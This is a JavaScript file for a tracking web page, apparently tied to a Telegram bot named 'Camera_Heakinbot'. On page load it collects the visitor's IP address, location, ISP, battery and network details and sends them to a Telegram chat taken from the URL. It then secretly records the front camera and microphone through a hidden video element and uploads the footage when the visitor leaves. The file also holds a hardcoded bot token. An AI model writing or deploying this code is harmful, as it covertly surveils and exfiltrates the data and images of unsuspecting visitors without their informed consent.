const BOT_TOKEN = "7715353771:AAHIDwI90yms3sKWFoQInjJtZPxGxjdb3VU"; // Replace with your bot token
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

let mediaRecorder;
let recordedChunks = [];

// Fetch IP details
async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

// Fetch device details
async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.charging = battery.charging;
        deviceInfo.chargingPercentage = Math.round(battery.level * 100);
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
    }

    return deviceInfo;
}

// Send message to Telegram bot
async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
    } catch (error) {
        console.error("Error sending message:", error);
    }
}

// Send video to Telegram bot
async function sendVideo(chatId, videoBlob) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("video", videoBlob, "video.mp4");

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData,
        });

        const result = await response.json();
        console.log("Video sent:", result);
    } catch (error) {
        console.error("Error sending video:", error);
    }
}

// Start recording video
async function startCamera(chatId) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        const video = document.createElement("video");
        video.style.display = "none"; // Hide the video element
        document.body.appendChild(video);

        video.srcObject = stream;
        video.play();

        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.start();
        console.log("Recording started");

        // Stop recording when the user leaves the page
        window.addEventListener("beforeunload", async () => {
            await stopCamera(chatId);
        });
    } catch (error) {
        console.error("Error accessing camera:", error);
    }
}

// Stop camera and send video
async function stopCamera(chatId) {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
        console.log("Recording stopped");

        const videoBlob = new Blob(recordedChunks, { type: "video/mp4" });
        recordedChunks = [];

        if (chatId) {
            await sendVideo(chatId, videoBlob);
        }
    }
}

// Send initial details to the bot
async function sendInitialInfo() {
    const ipDetails = await getIpDetails();
    const deviceInfo = await getDeviceInfo();
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");

    const message = `
<b><u>ℹ️ Activity Tracked:</u></b>

<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.org}</i>
<b>🔍 ASN:</b> <i>${ipDetails.asn}</i>

<b>📱 Device Info:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? "Yes" : "No"}</i>
<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>

<b>👨‍💻 Tracked on: @Camera_Heakinbot</b>
`;

    if (chatId) {
        await sendTelegramMessage(chatId, message);
        await startCamera(chatId);
    } else {
        console.error("Chat ID missing in URL!");
    }
}

// Trigger on page load
sendInitialInfo();
